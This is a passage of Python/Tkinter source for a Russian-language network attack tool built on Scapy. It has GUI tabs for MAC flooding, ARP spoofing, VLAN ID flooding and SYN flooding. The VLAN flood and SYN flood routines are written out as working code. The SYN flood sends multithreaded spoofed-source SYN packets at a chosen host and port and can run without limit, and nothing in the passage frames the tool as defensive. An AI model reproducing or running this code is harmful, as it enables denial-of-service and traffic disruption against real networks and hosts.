        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.custom_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.custom_log.pack(fill='both', expand=True, padx=5, pady=5)

        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.custom_log), width=14).pack()

        self.custom_attack_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'received_packets': 0,
            'last_update': 0,
            'last_sent': 0,
            'total_bytes': 0
        }
    
    def setup_mac_flood_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        # Левая панель с параметрами
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        # Правая панель с логом
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)

        params_frame = ttk.LabelFrame(left_frame, text="Параметры MAC flood атаки")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        # Интерфейс
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.mac_flood_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.mac_flood_interface.pack(side='left', padx=2)
        self.mac_flood_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        # Целевой MAC
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Целевой MAC:", width=12).pack(side='left', padx=2)
        self.mac_flood_target = ttk.Entry(row2, width=25, font=('Arial', 9))
        self.mac_flood_target.pack(side='left', padx=2)
        self.mac_flood_target.insert(0, "ff:ff:ff:ff:ff:ff")
        
        # Количество пакетов
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Кол-во пакетов:", width=12).pack(side='left', padx=2)
        self.mac_flood_count = ttk.Entry(row3, width=10, font=('Arial', 9))
        self.mac_flood_count.pack(side='left', padx=2)
        self.mac_flood_count.insert(0, "10000")
        
        # Размер пакета
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Размер пакета:", width=12).pack(side='left', padx=2)
        self.mac_flood_size = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.mac_flood_size.pack(side='left', padx=2)
        self.mac_flood_size.insert(0, "128")
        ttk.Label(row4, text="байт").pack(side='left', padx=2)
        
        # Задержка
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        ttk.Label(row5, text="Задержка (сек):", width=12).pack(side='left', padx=2)
        self.mac_flood_delay = ttk.Entry(row5, width=10, font=('Arial', 9))
        self.mac_flood_delay.pack(side='left', padx=2)
        self.mac_flood_delay.insert(0, "0.001")
        
        # Случайные MAC
        row6 = ttk.Frame(params_frame)
        row6.pack(fill='x', padx=5, pady=5)
        self.mac_flood_random = tk.BooleanVar(value=True)
        ttk.Checkbutton(row6, text="Случайные MAC", 
                       variable=self.mac_flood_random).pack(side='left', padx=5)
        
        # === КНОПКИ УПРАВЛЕНИЯ ===
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.mac_flood_start_btn = ttk.Button(button_frame, text="Начать MAC flood", 
                                            command=self.start_mac_flood, width=15)
        self.mac_flood_start_btn.pack(side='left', padx=5)
        
        self.mac_flood_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                           command=self.stop_mac_flood, width=15, state='disabled')
        self.mac_flood_stop_btn.pack(side='left', padx=5)
        
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.mac_flood_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.mac_flood_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.mac_flood_rate = ttk.Label(stats_grid, text="0 пак/сек", width=15, anchor='w')
        self.mac_flood_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Уникальных MAC:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.mac_flood_unique = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.mac_flood_unique.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.mac_flood_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.mac_flood_time.grid(row=3, column=1, padx=5, pady=2, sticky='w')
        
        log_frame = ttk.LabelFrame(right_frame, text="Лог MAC flood")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.mac_flood_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.mac_flood_log.pack(fill='both', expand=True, padx=5, pady=5)

        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.mac_flood_log), width=14).pack()

        self.mac_flood_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': 0,
            'last_sent': 0
        }
    
    def setup_arp_spoof_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        # Левая панель с параметрами
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        # Правая панель с логом
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)

        params_frame = ttk.LabelFrame(left_frame, text="Параметры ARP Spoofing")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        # Целевой IP
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="IP Адрес:", width=12).pack(side='left', padx=2)
        self.arp_target_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
        self.arp_target_ip.pack(side='left', padx=2)
        self.arp_target_ip.insert(0, "192.168.1.2")
        
        # Шлюз IP
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Шлюз IP:", width=12).pack(side='left', padx=2)
        self.arp_gateway_ip = ttk.Entry(row2, width=25, font=('Arial', 9))
        self.arp_gateway_ip.pack(side='left', padx=2)
        self.arp_gateway_ip.insert(0, "192.168.1.3")
        
        # Интерфейс
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.arp_spoof_interface = ttk.Combobox(row3, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.arp_spoof_interface.pack(side='left', padx=2)
        self.arp_spoof_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        # Интервал
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Интервал (сек):", width=12).pack(side='left', padx=2)
        self.arp_spoof_interval = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.arp_spoof_interval.pack(side='left', padx=2)
        self.arp_spoof_interval.insert(0, "2")
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.arp_spoof_start_btn = ttk.Button(button_frame, text="Начать ARP Spoofing", 
                                            command=self.start_arp_spoof, width=18)
        self.arp_spoof_start_btn.pack(side='left', padx=5)
        
        self.arp_spoof_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                           command=self.stop_arp_spoof, width=15, state='disabled')
        self.arp_spoof_stop_btn.pack(side='left', padx=5)
        
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.arp_spoof_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_rate = ttk.Label(stats_grid, text="0 пак/сек", width=15, anchor='w')
        self.arp_spoof_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.arp_spoof_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        log_frame = ttk.LabelFrame(right_frame, text="Лог ARP Spoofing")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.arp_spoof_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.arp_spoof_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.arp_spoof_log), width=14).pack()

        self.arp_spoof_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'last_update': 0,
            'last_sent': 0
        }
    
    def setup_vlan_flood_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        # Левая панель с параметрами
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        # Правая панель с логом
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры VLAN ID flood")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        # Интерфейс
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.vlan_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.vlan_interface.pack(side='left', padx=2)
        self.vlan_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        # Диапазон VLAN ID
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Диапазон VLAN:", width=12).pack(side='left', padx=2)
        self.vlan_min = ttk.Entry(row2, width=5, font=('Arial', 9))
        self.vlan_min.pack(side='left', padx=2)
        self.vlan_min.insert(0, "1")
        ttk.Label(row2, text="до").pack(side='left', padx=2)
        self.vlan_max = ttk.Entry(row2, width=5, font=('Arial', 9))
        self.vlan_max.pack(side='left', padx=2)
        self.vlan_max.insert(0, "100")
        
        # Источник MAC
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Источник MAC:", width=12).pack(side='left', padx=2)
        self.vlan_src_mac = ttk.Entry(row3, width=25, font=('Arial', 9))
        self.vlan_src_mac.pack(side='left', padx=2)
        self.vlan_src_mac.insert(0, "")
        ttk.Label(row3, text="(пусто=случайный)").pack(side='left', padx=5)
        
        # Задержка
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Задержка (сек):", width=12).pack(side='left', padx=2)
        self.vlan_delay = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.vlan_delay.pack(side='left', padx=2)
        self.vlan_delay.insert(0, "0.01")
        
        # Количество пакетов
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        ttk.Label(row5, text="Кол-во пакетов:", width=12).pack(side='left', padx=2)
        self.vlan_count = ttk.Entry(row5, width=10, font=('Arial', 9))
        self.vlan_count.pack(side='left', padx=2)
        self.vlan_count.insert(0, "10000")

        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.vlan_start_btn = ttk.Button(button_frame, text="Начать VLAN FLOOD", 
                                       command=self.start_vlan_flood, width=18)
        self.vlan_start_btn.pack(side='left', padx=5)
        
        self.vlan_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                      command=self.stop_vlan_flood, width=15, state='disabled')
        self.vlan_stop_btn.pack(side='left', padx=5)

        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено кадров:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.vlan_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.vlan_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.vlan_rate = ttk.Label(stats_grid, text="0 кадр/сек", width=15, anchor='w')
        self.vlan_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Уникальных VLAN:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.vlan_unique = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.vlan_unique.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.vlan_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.vlan_time.grid(row=3, column=1, padx=5, pady=2, sticky='w')

        log_frame = ttk.LabelFrame(right_frame, text="Лог VLAN ID flood")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.vlan_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.vlan_log.pack(fill='both', expand=True, padx=5, pady=5)

        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.vlan_log), width=14).pack()

        self.vlan_stats = {
            'start_time': 0,
            'sent_frames': 0,
            'unique_vlans': set(),
            'last_update': 0,
            'last_sent': 0
        }
    
    def start_vlan_flood(self):
        if self.vlan_attack_running:
            return
            
        self.vlan_attack_running = True
        self.vlan_start_btn.config(state='disabled')
        self.vlan_stop_btn.config(state='normal')
        
        try:
            interface = self.vlan_interface.get()
            vlan_min = int(self.vlan_min.get())
            vlan_max = int(self.vlan_max.get())
            src_mac = self.vlan_src_mac.get()
            delay = float(self.vlan_delay.get())
            count = int(self.vlan_count.get())
        except:
            vlan_min = 1
            vlan_max = 100
            src_mac = ""
            delay = 0.01
            count = 10000
        
        self.vlan_stats = {
            'start_time': time.time(),
            'sent_frames': 0,
            'unique_vlans': set(),
            'last_update': time.time(),
            'last_sent': 0
        }
        
        self.vlan_thread = threading.Thread(
            target=self.run_vlan_flood,
            args=(interface, vlan_min, vlan_max, src_mac, delay, count),
            daemon=True
        )
        
        self.vlan_log.insert('end', f"Запуск VLAN ID flood атаки\n")
        self.vlan_log.insert('end', f"Диапазон VLAN: {vlan_min}-{vlan_max}\n")
        self.vlan_log.insert('end', f"Интерфейс: {interface}\n")
        self.vlan_log.insert('end', f"Задержка: {delay} сек\n")
        self.vlan_log.insert('end', f"Целевое количество: {count} кадров\n")
        
        self.vlan_thread.start()
        self.update_vlan_stats()
        
        self.status_var.set("VLAN ID flood запущен")
    
    def stop_vlan_flood(self):
        if not self.vlan_attack_running:
            return
            
        self.vlan_attack_running = False
        self.vlan_start_btn.config(state='normal')
        self.vlan_stop_btn.config(state='disabled')
        
        if self.vlan_thread and self.vlan_thread.is_alive():
            time.sleep(0.5)
        
        total_time = time.time() - self.vlan_stats['start_time']
        total_frames = self.vlan_stats['sent_frames']
        unique_vlans = len(self.vlan_stats['unique_vlans'])
        
        self.vlan_log.insert('end', f"\nVLAN ID flood остановлен\n")
        self.vlan_log.insert('end', f"Итоговая статистика:\n")
        self.vlan_log.insert('end', f"  • Всего кадров: {total_frames}\n")
        self.vlan_log.insert('end', f"  • Уникальных VLAN: {unique_vlans}\n")
        self.vlan_log.insert('end', f"  • Общее время: {total_time:.1f} сек\n")
        self.vlan_log.insert('end', f"  • Средняя скорость: {int(total_frames/total_time) if total_time > 0 else 0} кадр/сек\n")
        
        self.status_var.set("VLAN ID flood остановлен")
    
    def update_vlan_stats(self):
        if not self.vlan_attack_running:
            return
            
        current_time = time.time()
        duration = current_time - self.vlan_stats['start_time']
        time_diff = current_time - self.vlan_stats['last_update']
        
        if time_diff >= 1:
            frames_sent = self.vlan_stats['sent_frames'] - self.vlan_stats.get('last_sent', 0)
            current_rate = frames_sent / time_diff if time_diff > 0 else 0
            
            self.vlan_rate.config(text=f"{int(current_rate)} кадр/сек")
            self.vlan_stats['last_update'] = current_time
            self.vlan_stats['last_sent'] = self.vlan_stats['sent_frames']
        
        self.vlan_sent.config(text=str(self.vlan_stats['sent_frames']))
        self.vlan_unique.config(text=str(len(self.vlan_stats['unique_vlans'])))
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.vlan_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.vlan_attack_running:
            self.root.after(1000, self.update_vlan_stats)
    
    def run_vlan_flood(self, interface, vlan_min, vlan_max, src_mac, delay, total_count):
        frame_count = 0
        
        try:
            self.vlan_log.insert('end', f"Запуск генерации кадров с VLAN ID\n")
            
            while self.vlan_attack_running and frame_count < total_count:
                current_vlan = random.randint(vlan_min, vlan_max)
                
                if src_mac:
                    ether = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
                else:
                    ether = Ether(src="%02x:%02x:%02x:%02x:%02x:%02x" % (
                        random.randint(0, 255), random.randint(0, 255),
                        random.randint(0, 255), random.randint(0, 255),
                        random.randint(0, 255), random.randint(0, 255)
                    ), dst="ff:ff:ff:ff:ff:ff")

                vlan_tag = Dot1Q(vlan=current_vlan)

                src_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                dst_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                
                packet = ether / vlan_tag / IP(src=src_ip, dst=dst_ip) / ICMP() / b"VLAN Flood Test"

                try:
                    sendp(packet, iface=interface, verbose=0)
                    frame_count += 1
                    self.vlan_stats['sent_frames'] = frame_count
                    self.vlan_stats['unique_vlans'].add(current_vlan)
                    
                    if frame_count % 1000 == 0:
                        current_rate = frame_count / (time.time() - self.vlan_stats['start_time'])
                        self.vlan_log.insert('end', f"Отправлено {frame_count:,} кадров | Уникальных VLAN: {len(self.vlan_stats['unique_vlans'])} | Скорость: {int(current_rate):,} кадр/сек\n")
                        self.vlan_log.see('end')
                        
                except Exception as e:
                    self.vlan_log.insert('end', f"Ошибка отправки кадра: {str(e)[:50]}\n")

                if delay > 0:
                    time.sleep(delay)
                
        except Exception as e:
            self.vlan_log.insert('end', f"Ошибка во время VLAN FLOOD: {str(e)}\n")
        finally:
            self.stop_vlan_flood()
            self.vlan_log.insert('end', f"VLAN ID flood завершен. Всего кадров: {frame_count:,}\n")
    
    def setup_syn_flood_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        # Левая панель с параметрами
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        # Правая панель с логом
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры SYN-FLOOD атаки")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        # Целевой IP
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="IP Адрес:", width=12).pack(side='left', padx=2)
        self.syn_target_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
        self.syn_target_ip.pack(side='left', padx=2)
        self.syn_target_ip.insert(0, "192.168.1.1")
        
        # Порт
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Порт:", width=12).pack(side='left', padx=2)
        self.syn_target_port = ttk.Entry(row2, width=10, font=('Arial', 9))
        self.syn_target_port.pack(side='left', padx=2)
        self.syn_target_port.insert(0, "80")
        
        # Интерфейс
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.syn_interface = ttk.Combobox(row3, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.syn_interface.pack(side='left', padx=2)
        self.syn_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        # Количество потоков
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Потоков:", width=12).pack(side='left', padx=2)
        self.syn_threads = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.syn_threads.pack(side='left', padx=2)
        self.syn_threads.insert(0, "10")
        
        # Количество пакетов
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        ttk.Label(row5, text="Кол-во пакетов:", width=12).pack(side='left', padx=2)
        self.syn_count = ttk.Entry(row5, width=10, font=('Arial', 9))
        self.syn_count.pack(side='left', padx=2)
        self.syn_count.insert(0, "0")
        ttk.Label(row5, text="(0=бесконечно)").pack(side='left', padx=5)

        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.syn_start_btn = ttk.Button(button_frame, text="Начать SYN-FLOOD", 
                                      command=self.start_syn_flood, width=18)
        self.syn_start_btn.pack(side='left', padx=5)
        
        self.syn_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                     command=self.stop_syn_flood, width=15, state='disabled')
        self.syn_stop_btn.pack(side='left', padx=5)

        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.syn_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.syn_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.syn_rate = ttk.Label(stats_grid, text="0 пак/сек", width=15, anchor='w')
        self.syn_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.syn_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.syn_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')

        log_frame = ttk.LabelFrame(right_frame, text="Лог SYN-FLOOD")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.syn_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.syn_log.pack(fill='both', expand=True, padx=5, pady=5)

        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.syn_log), width=14).pack()

        self.syn_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'last_update': 0,
            'last_sent': 0
        }
    
    def start_syn_flood(self):
        if self.syn_flood_running:
            return
            
        self.syn_flood_running = True
        self.syn_start_btn.config(state='disabled')
        self.syn_stop_btn.config(state='normal')
        
        try:
            target_ip = self.syn_target_ip.get()
            target_port = int(self.syn_target_port.get())
            interface = self.syn_interface.get()
            num_threads = int(self.syn_threads.get())
            packet_count = int(self.syn_count.get())
        except:
            target_ip = "192.168.1.1"
            target_port = 80
            interface = self.network_interfaces[0] if self.network_interfaces else "Ethernet"
            num_threads = 10
            packet_count = 0
        
        self.syn_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'last_update': time.time(),
            'last_sent': 0
        }
        
        self.syn_log.insert('end', f"Запуск SYN-FLOOD атаки\n")
        self.syn_log.insert('end', f"Цель: {target_ip}:{target_port}\n")
        self.syn_log.insert('end', f"Потоков: {num_threads}\n")
        self.syn_log.insert('end', f"Режим: {'Бесконечный' if packet_count == 0 else f'{packet_count} пакетов'}\n")

        self.syn_threads_list = []
        self.syn_stop_event = threading.Event()
        
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.run_syn_flood_worker,
                args=(i+1, target_ip, target_port, interface, packet_count),
                daemon=True
            )
            thread.start()
            self.syn_threads_list.append(thread)
        
        self.update_syn_stats()
        
        self.status_var.set(f"SYN-FLOOD запущен: {target_ip}:{target_port}")
    
    def stop_syn_flood(self):
        self.syn_flood_running = False
        self.syn_stop_event.set()
        self.syn_start_btn.config(state='normal')
        self.syn_stop_btn.config(state='disabled')
        
        for thread in self.syn_threads_list:
            if thread.is_alive():
                thread.join(timeout=1.0)
        
        total_time = time.time() - self.syn_stats['start_time']
        total_packets = self.syn_stats['sent_packets']
        
        self.syn_log.insert('end', f"\nSYN-FLOOD остановлен\n")
        self.syn_log.insert('end', f"Итоговая статистика:\n")
        self.syn_log.insert('end', f"  • Всего пакетов: {total_packets}\n")
        self.syn_log.insert('end', f"  • Общее время: {total_time:.1f} сек\n")
        self.syn_log.insert('end', f"  • Средняя скорость: {int(total_packets/total_time) if total_time > 0 else 0} пак/сек\n")
        
        self.status_var.set("SYN-FLOOD остановлен")
    
    def update_syn_stats(self):
        if not self.syn_flood_running:
            return
            
        current_time = time.time()
        duration = current_time - self.syn_stats['start_time']
        time_diff = current_time - self.syn_stats['last_update']
        
        if time_diff >= 1:
            packets_sent = self.syn_stats['sent_packets'] - self.syn_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            
            self.syn_rate.config(text=f"{int(current_rate)} пак/сек")
            self.syn_stats['last_update'] = current_time
            self.syn_stats['last_sent'] = self.syn_stats['sent_packets']
        
        self.syn_sent.config(text=str(self.syn_stats['sent_packets']))
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.syn_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.syn_flood_running:
            self.root.after(1000, self.update_syn_stats)
    
    def run_syn_flood_worker(self, worker_id, target_ip, target_port, interface, total_count):
        """Рабочий поток для SYN-FLOOD"""
        packet_count = 0
        
        try:
            self.syn_log.insert('end', f"")
            
            while self.syn_flood_running and not self.syn_stop_event.is_set():  # Добавил проверку syn_flood_running
                if total_count > 0 and packet_count >= total_count:
                    break

                src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=target_port,
                    flags="S",  # SYN флаг
                    seq=random.randint(1, 4294967295),
                    window=random.randint(1024, 65535)
                )

                try:
                    send(packet, iface=interface, verbose=0)
                    packet_count += 1

                    with threading.Lock():
                        self.syn_stats['sent_packets'] += 1

                    if packet_count % 1000 == 0 and self.syn_flood_running:  # Добавил проверку
                        current_rate = packet_count / (time.time() - self.syn_stats['start_time'])
                        self.syn_log.insert('end', f"Отправлено: {packet_count:,} | Скорость: {int(current_rate):,} пак/сек\n")
                        self.syn_log.see('end')
                        
                except Exception as e:
                    self.syn_log.insert('end', f"Ошибка отправки: {str(e)[:50]}\n")
                    if self.syn_flood_running:  # Небольшая пауза при ошибке, если атака еще идет
                        time.sleep(0.01)
                
        except Exception as e:
            self.syn_log.insert('end', f"Критическая ошибка: {str(e)}\n")
        finally:
            self.syn_log.insert('end', f"")
    def setup_access_tab(self, parent):
        """Настройка вкладки Доступ"""
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        top_frame = ttk.Frame(main_frame)
        top_frame.pack(fill='x', padx=5, pady=5)
        
        input_frame = ttk.LabelFrame(top_frame, text="Базовые функции доступа")
        input_frame.pack(fill='x', padx=5, pady=5)
        
        # IP адрес
        ttk.Label(input_frame, text="IP адрес:").grid(row=0, column=0, padx=4, pady=3, sticky='w')
        self.access_ip = ttk.Entry(input_frame, width=18, font=('Arial', 9))
        self.access_ip.grid(row=0, column=1, padx=4, pady=3, sticky='w')
        self.access_ip.insert(0, "192.168.1.1")
        
        # Кнопки базовых функций
        button_frame1 = ttk.Frame(input_frame)
